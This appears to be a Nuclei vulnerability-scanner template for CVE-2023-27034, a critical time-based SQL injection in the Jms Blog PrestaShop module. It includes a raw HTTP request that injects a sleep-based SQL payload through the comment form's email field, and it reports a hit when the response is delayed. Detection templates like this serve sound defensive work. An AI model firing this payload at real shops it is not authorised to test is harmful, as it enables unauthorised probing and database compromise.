flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(tolower(body), "jmsblog")
    internal: true
    type: dsl
  max-redirects: 3
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - dsl:
    - duration>=6
    type: dsl
  max-redirects: 3
  raw:
  - '@timeout: 20s

    POST /module/jmsblog/index.php?action=submitComment&controller=post&fc=module&module=jmsblog&post_id=1
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw

    X-Requested-With: XMLHttpRequest


    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="comment"


    555

    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="customer_name"



    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="email"


    0''XOR(if(now()=sysdate(),sleep(6),0))XOR''Z

    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="post_id"


    1

    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="post_id_comment_reply"


    1

    ------------YWJkMTQzNDcw

    Content-Disposition: form-data; name="submitComment"


    submitComment=

    ------------YWJkMTQzNDcw--

    '
id: CVE-2023-27034
info:
  author: MaStErChO
  classification:
    cpe: cpe:2.3:a:joommasters:jms_blog:2.5.5:*:*:*:*:prestashop:*:*
    cve-id: CVE-2023-27034
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99543
    epss-score: 0.89821
  description: 'The module Jms Blog (jmsblog) from Joommasters contains a Time Based
    SQL injection vulnerability. This module is for the PrestaShop e-commerce platform
    and mainly provided with joommasters PrestaShop themes

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the entire application and its
    underlying infrastructure.

    '
  metadata:
    framework: prestashop
    max-request: 2
    product: jms_blog
    vendor: joommasters
  name: Jms Blog - SQL Injection
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27034
  - https://security.friendsofpresta.org/modules/2023/03/13/jmsblog.html
  - https://github.com/advisories/GHSA-7jr7-v6gv-m656
  - https://friends-of-presta.github.io/security-advisories/modules/2023/03/13/jmsblog.html
  - https://github.com/codeb0ss/CVE-2023-27034-Exploit
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: critical
  tags: time-based-sqli,cve2023,cve,prestashop,prestashop-module,sqli,intrusive,joommasters,vkev,vuln
